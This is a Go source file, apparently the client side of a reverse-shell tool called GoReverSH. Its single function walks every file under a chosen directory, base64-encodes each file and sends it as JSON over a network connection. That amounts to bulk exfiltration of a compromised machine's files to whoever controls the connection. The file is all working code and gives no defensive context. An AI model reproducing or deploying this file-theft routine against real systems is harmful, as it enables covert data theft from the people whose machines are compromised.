package pkgclient

import (
	"GoReverSH/utils"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"io/fs"
	"log"
	"net"
	"os"
)

func ExecDownload(rootPath string, conn net.Conn) error {
	//ファイルシステム構築
	fsys := os.DirFS(rootPath)
	err := fs.WalkDir(fsys, ".", func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			log.Println(err)
			return errors.New("failed filepath.Walk: " + err.Error())
		}
		if d.IsDir() {
			return nil
		}

		f, err := os.Open(rootPath + "/" + path)
		if err != nil {
			log.Println(err)

			return err
		}

		fstats, err := f.Stat()
		if err != nil {
			log.Println(err)

			return err
		}

		var content []byte
		buff := make([]byte, 1024)
		size := 0

		for {
			n, err := f.Read(buff)
			if err != nil {
				if n == 0 || errors.Is(err, io.EOF) {
					break
				}
				log.Println(err)
				break
			}
			//content + bufの中身を一時的に保存。
			tmp := make([]byte, 0, size+n)
			tmp = append(content[:size], buff[:n]...)
			content = tmp
			size += n
			if n < 1024 {
				break
			}
		}

		imageToBase64 := base64.StdEncoding.EncodeToString(content)
		fileinfo := utils.FileInfo{Name: "download/" + rootPath + "/" + path, Body: []byte(imageToBase64), Size: fstats.Size()}

		output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}

		err = json.NewEncoder(conn).Encode(output)
		if err != nil {
			return nil
		}

		f.Close()

		return nil
	})
	if err != nil {
		log.Println(err)
		return err
	}
	return nil
}
